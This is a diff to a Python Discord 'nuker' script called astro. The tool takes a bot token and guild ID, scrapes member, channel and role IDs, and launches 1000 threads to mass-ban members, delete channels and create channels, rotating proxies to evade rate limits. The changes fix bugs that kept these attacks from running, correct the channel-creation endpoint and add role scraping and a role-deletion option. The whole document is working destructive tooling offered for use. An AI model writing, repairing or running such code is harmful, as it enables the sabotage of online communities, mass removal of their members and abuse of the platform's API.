@@ -73,7 +73,7 @@ class astro:
     token = input(Colorate.Vertical(Colors.yellow_to_red, "astro@localhost - enter token: \u001b[0m", 1))
     guild = input(Colorate.Vertical(Colors.yellow_to_red, "astro@localhost - enter guild id: \u001b[0m", 1))
     channame = input(Colorate.Vertical(Colors.yellow_to_red, "astro@localhost - enter channel name: \u001b[0m", 1))
-    option = ""
+    option = []
     headers = {"Authorization": f"Bot {token}"}
     q = queue.Queue()
     apiv = ["v9", "v6"]
@@ -89,7 +89,7 @@ class astro:
                 proxy = {"HTTP": f"http://{random.choice(pr)}"}
                 s = req(url, headers=headers)
                 if s.status_code == 404:
-                    print(Colorate.Vertical(Colors.yellow_to_red, f"astro@localhost - deleted a total of {count} channels.", 1))
+                    print(Colorate.Vertical(Colors.yellow_to_red, f"astro@localhost - deleted a total of {astro.count} channels.", 1))
                     for i in range(400):
                         input()
                 astro.count += 1
@@ -104,16 +104,11 @@ class astro:
     def chancrereqsend():
         try:
             while True:
-                httpx = httpx.Client()
                 req, url, headers = astro.q.get()
                 p = open("proxies.txt", "r")
                 pr = p.readlines()
                 proxy = {"HTTP": f"http://{random.choice(pr)}"}
-                s = req(url, headers=headers, param=astro.jsonparam)
-                if s.status_code == 404:
-                    print(Colorate.Vertical(Colors.yellow_to_red, f"astro@localhost - deleted a total of {count} channels.", 1))
-                    for i in range(400):
-                        input()
+                s = req(url, headers=headers, data=astro.jsonparam)
                 astro.count += 1
                 print(Colorate.Vertical(Colors.yellow_to_red, f"astro@localhost - {astro.count} channel created - status code: {s.status_code} - time: {time.ctime()}", 1))
                 astro.q.task_done()
@@ -121,6 +116,7 @@ class astro:
             if err in ('_ssl.c:980: The handshake operation timed out', '[Errno 104] Connection reset by peer'):
                 print(Colorate.Vertical(Colors.yellow_to_red, f"astro@localhost - timedout", 1))
             else:
+                print(err)
                 print(Colorate.Vertical(Colors.yellow_to_red, f"astro@localhost - either handshake timedout or connection reset by peer, continuing..", 1))
 
     def massbansend():
@@ -186,7 +182,7 @@ class astro:
 
     def channelmakeworker():
         for i in range(1000):
-            ranchancrapi = [f"https://discord.com/api/v9/channels/", f"https://discordapp.com/api/v9/channels/", f"https://canary.discord.com/api/v9/channels/", f"https://ptb.discord.com/api/v9/channels"]
+            ranchancrapi = [f"https://discord.com/api/v9/guilds/{astro.guild}/channels/", f"https://discordapp.com/api/v9/guilds/{astro.guild}/channels/", f"https://canary.discord.com/api/v9/guilds/{astro.guild}/channels/", f"https://ptb.discord.com/api/v9/guilds/{astro.guild}/channels"]
             astro.q.put((httpx.post, random.choice(ranchancrapi), astro.headers))
 
     @client.event
@@ -204,14 +200,18 @@ class astro:
         with open('scraped/channels.txt', 'a') as c:
             for channel in id.channels:
                 c.write(f"{channel.id}\n")
+        with open("scraped/roles.txt", "a") as o:
+            for role in id.roles:
+                o.write(f"{role.id}\n")
         with open('scraped/scraped.txt', 'a') as z:
             for member in members:
                 z.write(str(member.id) + "\n")
         print(Colorate.Vertical(Colors.yellow_to_red, "astro@localhost - [1] massban ids?", 1))
         print(Colorate.Vertical(Colors.yellow_to_red, "astro@localhost - [2] massban scraped?", 1))
         print(Colorate.Vertical(Colors.yellow_to_red, "astro@localhost - [3] delete channels?", 1))
-        print(Colorate.Vertical(Colors.yellow_to_red, "astro@localhost - [4] make channels?", 1))
-        print(Colorate.Vertical(Colors.yellow_to_red, "astro@localhost - [5] spam channels (UNFINISHED)", 1))
+        print(Colorate.Vertical(Colors.yellow_to_red, "astro@localhost - [4] delete roles?", 1))
+        print(Colorate.Vertical(Colors.yellow_to_red, "astro@localhost - [5] make channels? (UNFINISHED)", 1))
+        print(Colorate.Vertical(Colors.yellow_to_red, "astro@localhost - [6] spam channels (UNFINISHED)", 1))
         option = input(Colorate.Vertical(Colors.yellow_to_red, "astro@localhost - choice: \u001b[0m", 1))
         if option == "1":
             if os.name == "nt":
@@ -220,7 +220,10 @@ class astro:
                 os.system("clear")
             print(Colorate.Vertical(Colors.yellow_to_red, astro.logo, 1))
             time.sleep(5)
+            print(astro.option)
             astro.idworker()
+            for x in range(1000):
+                threading.Thread(target=astro.massbansend, daemon=True).start()
         if option == "2":
             if os.name == "nt":
                 os.system("cls")
@@ -228,7 +231,10 @@ class astro:
                 os.system("clear")
             print(Colorate.Vertical(Colors.yellow_to_red, astro.logo, 1))
             time.sleep(5)
+            print(astro.option)
             astro.massbanworker()
+            for x in range(1000):
+                threading.Thread(target=astro.massbansend, daemon=True).start()
         if option == "3":
             if os.name == "nt":
                 os.system("cls")
@@ -236,7 +242,10 @@ class astro:
                 os.system("clear")
             print(Colorate.Vertical(Colors.yellow_to_red, astro.logo, 1))
             time.sleep(5)
+            print(astro.option)
             astro.channeldelworker()
+            for x in range(1000):
+                threading.Thread(target=astro.chandelreqsend, daemon=True).start()
         if option == "4":
             if os.name == "nt":
                 os.system("cls")
@@ -244,20 +253,12 @@ class astro:
                 os.system("clear")
             print(Colorate.Vertical(Colors.yellow_to_red, astro.logo, 1))
             time.sleep(5)
+            print(astro.option)
             astro.channelmakeworker()
+            for x in range(1000):
+                threading.Thread(target=astro.chancrereqsend, daemon=True).start()
 
 if __name__ == "__main__":
-    if astro.option in ("1","2"):
-        for x in range(1000):
-            threading.Thread(target=astro.massbansend, daemon=True).start()
-
-    if astro.option == "3":
-        for x in range(1000):
-            threading.Thread(target=astro.chandelreqsend, daemon=True).start()
-
-    if astro.option == "4":
-        for x in range(1000):
-            threading.Thread(target=astro.chancrereqsend, daemon=True).start()
     try:
         client.run(astro.token)
     except:
